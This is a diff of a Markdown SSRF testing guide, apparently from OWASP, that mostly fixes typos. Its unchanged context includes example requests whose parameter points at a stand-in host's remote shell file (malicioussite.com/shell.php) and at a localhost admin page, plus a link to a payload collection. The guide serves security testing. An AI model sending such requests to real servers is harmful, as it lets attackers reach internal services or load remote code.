@@ -2,9 +2,9 @@
 
 ## Summary
 
-Often web applications may have to interact with internal or external resources in order to provide a certain functionality, with the expectation tha only the service providing that functionality will be used, but often such functionality processes user data and if not handled properly it can open the door for certain injection attacks that we call SSRF. A succesfull SSRF attack can grant the attacker access to restricted actions, internal services, internal files within the application or the organization. In some cases it can even lead to RCE.
+Often web applications may have to interact with internal or external resources in order to provide a certain functionality, with the expectation tha only the service providing that functionality will be used, but often such functionality processes user data and if not handled properly it can open the door for certain injection attacks that we call SSRF. A successful SSRF attack can grant the attacker access to restricted actions, internal services, internal files within the application or the organization. In some cases it can even lead to RCE.
 
-Some of the main mitigation attacks inlcude IP whitelisting and URL filtering. You can find out more on the
+Some of the main mitigation attacks include IP whitelisting and URL filtering. You can find out more on the
 [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
 
 ## Test Objectives
@@ -41,7 +41,7 @@ Content-Type: application/x-www-form-urlencoded
 page=https://malicioussite.com/shell.php
 ```
 
-Use the localhost/loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host than you have enought privileges to direclty access the `admin` page.
+Use the localhost/loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host than you have enough privileges to directly access the `admin` page.
 
 These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, is often what makes SSRF into a critical vulnerability.
 
@@ -49,7 +49,7 @@ These kind of trust relationships, where requests originating from the local mac
 GET /page HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 
-page=http://localhost/admin  // Alternative http://127.0.0.1/admin
+page=http://localhost/admin  #Alternative http://127.0.0.1/admin
 ```
 
 Fetch a local file
@@ -98,7 +98,7 @@ Sometimes the application allows input that matches a certain expression, like a
 - Fuzzing
 - Combinations of all of the above
 
-There are already prepared payloads available [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+You can find more payloads [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
 
 ## Tools
 
